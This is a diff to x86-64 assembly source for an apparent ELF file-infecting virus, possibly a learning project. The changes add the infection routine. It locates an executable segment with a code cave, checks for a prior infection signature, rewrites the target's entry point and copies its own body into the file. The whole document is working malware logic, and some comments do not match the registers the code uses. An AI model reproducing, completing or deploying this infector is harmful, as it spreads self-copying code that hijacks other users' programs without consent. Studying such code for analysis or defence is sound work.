@@ -107,7 +107,7 @@ _check_file:
 
 	; === Find text segment ===
 	_find_txt_seg:
-		mov r14, rax								; rax -> elf start addr
+		mov r14, rax								; rax -> elf start addr (needed for injection)
 		movzx r15, word [r14 + elf64_ehdr.e_phnum]	; r15 = number of segments
 		add r14, [r14 + elf64_ehdr.e_phoff]			; r14 -> start of segment headers's table
 		xor rcx, rcx								; loop counter
@@ -117,11 +117,11 @@ _check_file:
 		je	_leave_return
 		bt word [r14], 0					; segment is loadable
 		jnc _continue
-		bt qword [r14], 0x20
+		bt qword [r14], 0x20				; segment is executable (test the 32nd bit of r14)
 		jc _check_cave_size
 		_continue:
 		inc rcx
-		add r14, elf64_phdr_size			; r14 -> next_phdr(.p_type)
+		add r14, elf64_phdr_size			; r14 -> next_phdr(.p_type) (needed later)
 		jmp _segment_loop
 
 		_check_cave_size:
@@ -130,33 +130,48 @@ _check_file:
 			add r13, elf64_phdr.p_offset			; r13 -> next_phdr.offset
 			mov rbx, [r14 + elf64_phdr.p_offset]
 			add rbx, [r14 + elf64_phdr.p_filesz]
-			add rbx, CODE_LEN						; rbx = offset end of futur infected segment
+			add rbx, CODE_LEN						; rbx = offset end of futur parasite
 			cmp [r13], rbx
 			jle	_segment_loop
 
 	; === found text segment ===
 	_valid_seg_found:
-		add r14, [r14 + elf64_phdr.p_filesz]	; jmp to end of the segment
-		add r14, CODE_LEN
-		sub r14, _end - signature						; jmp to potential signature
+		mov r13, r14								; r13 -> curr_phdr
+		add r13, [r14 + elf64_phdr.p_filesz]		; jmp to end of the segment
+		add r13, CODE_LEN
+		sub r13, _end - signature					; jmp to potential signature
 		
 	; === check if infected ===
 		lea r12, signature
 		mov r12, [r12]
-		cmp r12, qword [r14]
+		cmp r12, qword [r13]
 		je	_leave_return
 		
 	; === Infection ===
 	_infection:
+		; === copy parasite ===
+		mov r13, rax							; rbx -> start of map
+		; === update headers === 
+		add r13, [r14 + elf64_phdr.p_offset]	; rbx -> start of segment
+		add r13, [r14 + elf64_phdr.p_filesz]	; jmp to end of the segment
+		mov r12, rax
+		add r12, elf64_ehdr.e_entry 			; r12 -> ehdr.e_entry
+		mov r11, [r12]							; r11 = entrypoint (we save r12 for later)
+		mov CHF(check_file.base_entry), r11
+		mov r11, r13							; r11 -> end of curr_segment
+		sub r11, rax 							; r11 = injection offset
+		mov [r12], r11
+		sub rax, elf64_ehdr.e_entry
+		; === copy parasite ===
 		push rcx
-		sub r14, elf64_phdr.p_filesz + CODE_LEN
 		xor rcx, rcx
-		mov rdi, r14									; rdi -> end of curr_seg(start of injection)
-		lea rsi, _start									; rsi -> end of our code
+		mov rdi, r13							; rdi -> end of curr_seg(start of injection)
+		lea rsi, [rel _start]					; rsi -> start of our code
 		mov rcx, CODE_LEN
-		cld												; copy from _start to _end (= !std)
+		cld										; copy from _start to _end (= !std)
 		rep movsb
-		_end_infection:
+		_end_copy:	; debug
+
 		pop rcx	
 		jmp _leave_return
 	; *** pas obligatoire ***
